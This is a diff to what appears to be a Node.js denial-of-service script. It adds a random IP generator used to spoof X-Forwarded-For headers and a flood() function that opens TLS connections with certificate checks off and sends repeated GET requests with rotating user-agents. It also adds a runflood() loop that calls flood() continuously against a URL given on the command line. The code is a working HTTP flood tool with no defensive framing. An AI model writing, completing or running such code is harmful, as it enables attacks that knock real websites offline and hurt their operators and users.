@@ -304,6 +304,60 @@ const UAs = [
 			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
 ];
 
+const getRandomNumberBetween = (min, max) => {
+    return Math.floor(Math.random() * (max - min + 1) + min);
+}
+
+const ip_spoofing = () =>{
+    return getRandomNumberBetween(1, 255) + "." + getRandomNumberBetween(1, 255) + "." + getRandomNumberBetween(1, 255) + "." + getRandomNumberBetween(1, 255)
+}
+
+function flood(){
+    tls.authorized = true;
+    tls.sync = true;
+    var TlsConnection = tls.connect({
+      ciphers: "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
+      secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
+      honorCipherOrder: true,
+      requestCert: false,
+      host: parsed.host,
+      port: 443,
+      secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
+      servername: parsed.host,
+      secure: true,
+      rejectUnauthorized: false
+    }, function () {
+      for (let i = 0; i < process.argv[4]; i++) {
+        TlsConnection.setKeepAlive(true, 10000)
+        TlsConnection.setTimeout(10000);
+        TlsConnection.write(`GET ${parsed.path}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + parsed.href + '\r\nOrigin: ' + parsed.href + '\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nX-Forwarded-For: ' + ip_spoofing() + `Cache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
+      }
+    }).on('disconnected', () => {
+        TlsConnection.destroy();
+        return delete TlsConnection
+    }).on('timeout', () => {
+        TlsConnection.destroy();
+        return delete TlsConnection
+    }).on('error', () => {
+        TlsConnection.destroy();
+        return delete TlsConnection
+    }).on('data', () => {
+        setTimeout(function () {
+            TlsConnection.destroy();
+            return delete TlsConnection
+        }, 8000);
+    }).on('end', () => {
+        TlsConnection.destroy();
+        return delete TlsConnection
+    });
+}
+
+function runflood(){
+    setInterval(() => {
+        flood();
+    })
+}
+
 if (process.argv.length !== 4) {
     console.log(`
         Usage: node ${path.basename(__filename)} <url> <time> 
